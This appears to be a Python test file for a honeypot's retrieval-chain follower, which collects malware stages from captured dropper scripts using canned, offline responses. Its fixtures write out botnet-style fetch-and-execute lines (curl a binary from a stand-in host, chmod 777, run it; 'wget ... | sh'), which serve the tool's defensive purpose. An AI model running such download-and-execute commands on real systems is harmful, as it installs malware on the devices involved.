#!/usr/bin/env python3
"""Check that a retrieval chain is followed, and bounded.

The gap this covers: a stage-1 dropper was fetched and stored, and the eleven
architecture URLs inside it -- the actual bot -- were never collected, because
nothing ever looked at the bytes.

No network. fetcher.fetch is replaced with a table of canned bodies, so every
control below is exercised against a chain that never leaves this process. Run
it directly:

    python3 intel/test_recursive.py
"""

import json
import os
import pathlib
import sys
import tempfile

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "intel"))

_TMP = tempfile.mkdtemp(prefix="drosera-chain-test-")
os.environ["STORAGE_DIR"] = _TMP
os.environ["LOOT_DIR"] = str(pathlib.Path(_TMP) / "loot")
os.environ["IOC_DIR"] = str(pathlib.Path(_TMP) / "ioc")
os.environ["FETCH_ENABLED"] = "true"

import chain                                                    # noqa: E402
import fetcher                                                  # noqa: E402
from shared import ioc, loot                                    # noqa: E402

C2 = "198.51.100.9"

# The sample shape from the 2026-08-01 telnet session. One line per CPU
# architecture, each naming a binary, chmod'ing it and running it.
ARCHES = ["arm", "arm5", "arm6", "arm7", "mips", "mipsel",
          "x86", "x86_64", "sh4", "ppc", "spc"]
WGET_SH = ("#!/bin/sh\n# cleanup\ncd /tmp || cd /var/run\n"
           + "".join(f"curl http://{C2}/{a} -o VFASXC{i}; "
                     f"chmod 777 VFASXC{i}; ./VFASXC{i} telnet.curl\n"
                     for i, a in enumerate(ARCHES))).encode()

ELF = b"\x7fELF\x02\x01\x01\x00" + bytes(512)

FAILED = 0


def check(label, condition, detail=""):
    global FAILED
    mark = "ok  " if condition else "FAIL"
    print(f"{mark} {label}" + (f"  -- {detail}" if detail and not condition else ""))
    if not condition:
        FAILED += 1
    return condition


def reset():
    """A clean quarantine, IOC store and rate-limiter state per scenario."""
    for name in ("loot", "ioc"):
        target = pathlib.Path(_TMP) / name
        if target.is_dir():
            for f in target.iterdir():
                # Quarantined blobs land 0400, and Windows refuses to unlink a
                # read-only file. On the appliance the directory permission is
                # what governs, so this is a test-host concern only.
                try:
                    f.chmod(0o600)
                except OSError:
                    pass
                f.unlink()
    fetcher._recent.clear()
    fetcher._host_seen.clear()
    fetcher._breaker.update({"failures": 0, "open_until": 0.0})


def serve(table, record=None):
    """Replace the network with a dict. Unknown URLs 404."""
    def _fetch(url, address):
        if record is not None:
            record.append(url)
        if url in table:
            body = table[url]
            if isinstance(body, Exception):
                raise body
            return body, f"{len(body)}B from {address}"
        return None, "http 404"
    fetcher.fetch = _fetch
    fetcher.resolve_public = lambda host, port: "198.51.100.9"


def seed_root(path_part="/wget.sh"):
    """An IOC record as the honeypot would have written it."""
    entry = ioc.extract(f"wget http://{C2}{path_part}")[0]
    ioc.record(f"wget http://{C2}{path_part}", ip="203.0.113.5", service="telnet")
    return entry, ioc.IOC_DIR / f"{ioc.key_for(entry)}.json"


# --------------------------------------------------------------- the parser

print("\n-- URL parser --")

for label, command, expect in [
    ("curl", f"curl http://{C2}/a -o x", ("http", C2, 80, "/a")),
    ("wget", f"wget http://{C2}:8080/b", ("http", C2, 8080, "/b")),
    ("busybox wget", f"/bin/busybox wget http://{C2}/c -O- | sh", ("http", C2, 80, "/c")),
    ("bare http URL", f"http://{C2}/d", ("http", C2, 80, "/d")),
    ("bare ftp URL", f"ftp://{C2}/e", ("ftp", C2, 21, "/e")),
    ("tftp -c get", f"tftp {C2} -c get f.sh", ("tftp", C2, 69, "/f.sh")),
    ("tftp -r -g", f"tftp -r g.sh -g {C2}", ("tftp", C2, 69, "/g.sh")),
    ("tftp -g -r file host", f"tftp -g -r i.sh {C2}", ("tftp", C2, 69, "/i.sh")),
    # The options must be consumed, not skipped lazily: this used to record a
    # host of `-v` and a path of `/anonymous`.
    ("ftpget", f"ftpget -v -u anonymous -p anonymous -P 21 {C2} h.sh h.sh",
     ("ftp", C2, 21, "/h.sh")),
    ("ftpget with no options", f"ftpget {C2} j.sh j.sh", ("ftp", C2, 21, "/j.sh")),
    ("ftpget with one filename", f"ftpget -v {C2} k.sh", ("ftp", C2, 21, "/k.sh")),
    ("ftpget on a non-default port",
     f"ftpget -u a -p b -P 2121 {C2} l.sh l.sh", ("ftp", C2, 2121, "/l.sh")),
]:
    got = chain.extract_from_body(command.encode())
    ok = got and (got[0]["scheme"], got[0]["host"], got[0]["port"],
                  got[0]["path"]) == expect
    check(f"{label} is extracted", ok, repr(got))

found = chain.extract_from_body(WGET_SH)
check("every architecture URL is extracted from wget.sh",
      len(found) == len(ARCHES), f"{len(found)} of {len(ARCHES)}")
check("the extracted paths are the architectures",
      sorted(e["path"].lstrip("/") for e in found) == sorted(ARCHES))
check("the source line is the whole line, not just the URL",
      all("chmod 777" in e["source_line"] for e in found),
      repr(found[0]["source_line"]) if found else "")

# ioc.extract()'s own cap is 12, sized for one command line. A dropper that
# puts every architecture on one line must not silently lose the overflow.
one_line = ("; ".join(f"curl http://{C2}/{a} -o z" for a in ARCHES)).encode()
check("a single-line dropper is not truncated by the per-command cap",
      len(chain.extract_from_body(one_line)) == len(ARCHES),
      str(len(chain.extract_from_body(one_line))))

check("an ELF is never parsed", chain.extract_from_body(ELF) == [])
check("an ELF is not text", chain.is_text(ELF) is False)
check("gzip is not text", chain.is_text(b"\x1f\x8b\x08" + bytes(64)) is False)
check("a NUL anywhere in the head means binary",
      chain.is_text(b"#!/bin/sh\nwget http://x/y\x00\n") is False)
check("a shell script is text", chain.is_text(WGET_SH) is True)
check("an empty body is not text", chain.is_text(b"") is False)
check("a body naming nothing yields nothing",
      chain.extract_from_body(b"#!/bin/sh\nls -la\nexit 0\n") == [])

# --------------------------------------------------------------- the chain

print("\n-- recursion --")

reset()
fetcher.MAX_DEPTH = 2
fetcher.MAX_PER_CHAIN = 16
fetcher.MAX_PER_HOUR = 100
requested = []
serve({f"http://{C2}:80/wget.sh": WGET_SH,
       **{f"http://{C2}:80/{a}": ELF + a.encode() for a in ARCHES}}, requested)

entry, path = seed_root()
fetcher.run_chain(entry, path)

samples = list((pathlib.Path(_TMP) / "loot").glob("*.bin"))
check("the dropper and every architecture are captured",
      len(samples) == 1 + len(ARCHES), f"{len(samples)} samples")
check("each architecture URL was requested exactly once",
      len(requested) == len(set(requested)) == 1 + len(ARCHES),
      f"{len(requested)} requests, {len(set(requested))} unique")

root_meta = json.loads(path.read_text())
check("the root sidecar records how many targets it named",
      (root_meta.get("fetch") or {}).get("derived") == len(ARCHES),
      repr(root_meta.get("fetch")))
check("existing sidecar fields are untouched",
      all(k in root_meta for k in ("scheme", "host", "port", "path", "method",
                                   "raw", "public", "first_seen", "last_seen",
                                   "times_seen", "sightings", "fetch")),
      repr(sorted(root_meta)))

# Where the clobber actually bit: a child is a bare extract() dict, so writing
# its fetch outcome from the entry in hand would drop everything _derive() had
# just persisted -- including the lineage this feature exists to record.
child_side = json.loads(
    (ioc.IOC_DIR / f"{ioc.key_for(found[0])}.json").read_text())
check("a derived sidecar keeps what record_derived wrote",
      all(k in child_side for k in ("scheme", "host", "port", "path", "method",
                                    "raw", "public", "first_seen", "last_seen",
                                    "times_seen", "sightings", "lineage",
                                    "fetch")),
      repr(sorted(child_side)))
check("a derived sidecar records its own fetch outcome",
      (child_side.get("fetch") or {}).get("status") == "captured",
      repr(child_side.get("fetch")))
check("child lineage survives the fetch write",
      (child_side.get("lineage") or {}).get("depth") == 1,
      repr(child_side.get("lineage")))

# Lineage, on a child sample.
child = next(p for p in samples if p.read_bytes() != WGET_SH)
child_meta = loot.read_meta(child.stem)
lineage = (child_meta["sightings"][-1] or {}).get("lineage") or {}
check("the child records its parent", bool(lineage.get("parent_sha256")),
      repr(lineage))
check("the child records its depth", lineage.get("depth") == 1, repr(lineage))
check("the child records the line it came from",
      "chmod 777" in (lineage.get("source_line") or ""), repr(lineage))
check("the child records the retrieval method",
      lineage.get("method") == "curl", repr(lineage))

parent_digest = lineage.get("parent_sha256")
parent_meta = loot.read_meta(parent_digest) if parent_digest else None
check("the parent digest resolves to the dropper",
      bool(parent_meta) and (pathlib.Path(_TMP) / "loot"
                             / f"{parent_digest}.bin").read_bytes() == WGET_SH)
check("the root sample carries no lineage",
      "lineage" not in (parent_meta or {}).get("sightings", [{}])[-1])

# --------------------------------------------------------------- the bounds

print("\n-- limits --")

# A three-level chain pins the depth semantics exactly: MAX_DEPTH counts
# levels of recursion, so the number of artifacts retrieved is depth + 1.
# stage1.sh -> stage2.sh -> the binary.
STAGE1 = f"#!/bin/sh\nwget http://{C2}/stage2.sh -O- | sh\n".encode()
STAGE2 = f"#!/bin/sh\ncurl http://{C2}/bot -o b; chmod 777 b; ./b\n".encode()
LADDER = {f"http://{C2}:80/stage1.sh": STAGE1,
          f"http://{C2}:80/stage2.sh": STAGE2,
          f"http://{C2}:80/bot": ELF}

for depth, expected, label in [
    (0, 1, "depth 0 fetches only what the command named"),
    (1, 2, "depth 1 follows one level"),
    (2, 3, "depth 2 follows two levels"),
    (3, 3, "a chain ends at the first binary regardless of depth"),
]:
    reset()
    fetcher.MAX_DEPTH = depth
    requested = []
    serve(LADDER, requested)
    entry, path = seed_root("/stage1.sh")
    fetcher.run_chain(entry, path)
    check(label, len(requested) == expected,
          f"{len(requested)} requests, expected {expected}")

reset()
fetcher.MAX_DEPTH = 1
requested = []
serve({f"http://{C2}:80/wget.sh": WGET_SH,
       **{f"http://{C2}:80/{a}": ELF for a in ARCHES}}, requested)
entry, path = seed_root()
fetcher.run_chain(entry, path)
check("depth 1 is enough to reach every architecture binary",
      len(requested) == 1 + len(ARCHES), f"{len(requested)} requests")

reset()
fetcher.MAX_DEPTH = 0
requested = []
serve({f"http://{C2}:80/wget.sh": WGET_SH}, requested)
entry, path = seed_root()
fetcher.run_chain(entry, path)
check("depth 0 is the original behaviour", len(requested) == 1)
check("depth 0 records no derived count",
      (json.loads(path.read_text()).get("fetch") or {}).get("derived") is None)

reset()
fetcher.MAX_DEPTH = 2
fetcher.MAX_PER_CHAIN = 4
requested = []
serve({f"http://{C2}:80/wget.sh": WGET_SH,
       **{f"http://{C2}:80/{a}": ELF for a in ARCHES}}, requested)
entry, path = seed_root()
fetcher.run_chain(entry, path)
check("the chain cap holds", len(requested) == 4, f"{len(requested)} requests")
check("targets past the cap are still recorded as IOCs",
      len(list(ioc.IOC_DIR.glob("*.json"))) == 1 + len(ARCHES),
      str(len(list(ioc.IOC_DIR.glob("*.json")))))

# A body that names itself must not loop.
reset()
fetcher.MAX_PER_CHAIN = 16
SELF = f"#!/bin/sh\nwget http://{C2}/self.sh\n".encode()
requested = []
serve({f"http://{C2}:80/self.sh": SELF}, requested)
entry, path = seed_root("/self.sh")
fetcher.run_chain(entry, path)
check("a self-referencing script is fetched once",
      len(requested) == 1, f"{len(requested)} requests")

# Two lines naming the same URL is one fetch, not two.
reset()
DUPE = f"#!/bin/sh\nwget http://{C2}/x\ncurl http://{C2}/x -o y\n".encode()
requested = []
serve({f"http://{C2}:80/dupe.sh": DUPE, f"http://{C2}:80/x": ELF}, requested)
entry, path = seed_root("/dupe.sh")
fetcher.run_chain(entry, path)
check("a URL named twice is fetched once",
      len(requested) == 2, f"{len(requested)} requests")

# --------------------------------------------------------------- failure

print("\n-- failure is not fatal --")

reset()
requested = []
serve({f"http://{C2}:80/wget.sh": WGET_SH,
       f"http://{C2}:80/arm": ELF}, requested)   # every other arch 404s
entry, path = seed_root()
try:
    fetcher.run_chain(entry, path)
    survived = True
except Exception as exc:                                        # noqa: BLE001
    survived = False
    print(f"     raised: {exc!r}")
check("a chain survives children that 404", survived)
check("the ones that did work are still captured",
      len(list((pathlib.Path(_TMP) / "loot").glob("*.bin"))) == 2,
      str(len(list((pathlib.Path(_TMP) / "loot").glob("*.bin")))))

reset()
serve({f"http://{C2}:80/wget.sh": OSError("connection reset")})
entry, path = seed_root()
try:
    fetcher.run_chain(entry, path)
    survived = True
except Exception:                                               # noqa: BLE001
    survived = False
check("a transport exception on the root does not propagate", survived)

reset()
serve({f"http://{C2}:80/wget.sh": WGET_SH,
       **{f"http://{C2}:80/{a}": ELF for a in ARCHES}})
fetcher.resolve_public = lambda host, port: None       # nothing is routable
entry, path = seed_root()
try:
    fetcher.run_chain(entry, path)
    survived = True
except Exception:                                               # noqa: BLE001
    survived = False
check("a chain whose host stops resolving does not propagate", survived)
check("a refusal is recorded on the sidecar",
      (json.loads(path.read_text()).get("fetch") or {}).get("status") == "refused")

# --------------------------------------------------------------- cooldown

print("\n-- the per-chain cooldown waiver --")

fetcher._host_seen.clear()
fetcher._breaker.update({"failures": 0, "open_until": 0.0})
fetcher._recent.clear()
fetcher._host_seen[C2] = __import__("time").time()
check("a new chain against a cooling host is still refused",
      fetcher._allowed_now(C2) is not None, repr(fetcher._allowed_now(C2)))
check("a host already in this chain is waived",
      fetcher._allowed_now(C2, {C2}) is None, repr(fetcher._allowed_now(C2, {C2})))
check("the waiver does not extend to an unrelated host",
      fetcher._allowed_now(C2, {"203.0.113.1"}) is not None)

fetcher._breaker["open_until"] = __import__("time").time() + 60
check("the waiver does not override the circuit breaker",
      fetcher._allowed_now(C2, {C2}) == "circuit breaker open")
fetcher._breaker["open_until"] = 0.0

fetcher._recent.extend([__import__("time").time()] * fetcher.MAX_PER_HOUR)
check("the waiver does not override the hourly ceiling",
      "hourly ceiling" in (fetcher._allowed_now(C2, {C2}) or ""))
fetcher._recent.clear()

# --------------------------------------------------------------- backfill

print("\n-- backfill of samples captured before recursion --")

reset()
fetcher.MAX_DEPTH = 2
digest = loot.capture(WGET_SH, ip="203.0.113.5", service="telnet",
                      origin="loader-fetch", filename="/wget.sh")
entry, path = seed_root()
entry["fetch"] = {"status": "captured", "detail": "old", "sha256": digest,
                  "at": "2026-08-01T00:00:00+00:00"}
path.write_text(json.dumps(entry))
before = len(list(ioc.IOC_DIR.glob("*.json")))
fetcher.backfill(entry, path)
after = len(list(ioc.IOC_DIR.glob("*.json")))
check("an already-captured dropper yields its architecture URLs with no fetch",
      after - before == len(ARCHES), f"{before} -> {after}")
check("backfill is not repeated once derived is recorded",
      fetcher.backfill(json.loads(path.read_text()), path) is False)

print(f"\n{FAILED} check(s) failed" if FAILED else "\nall checks passed")
sys.exit(1 if FAILED else 0)
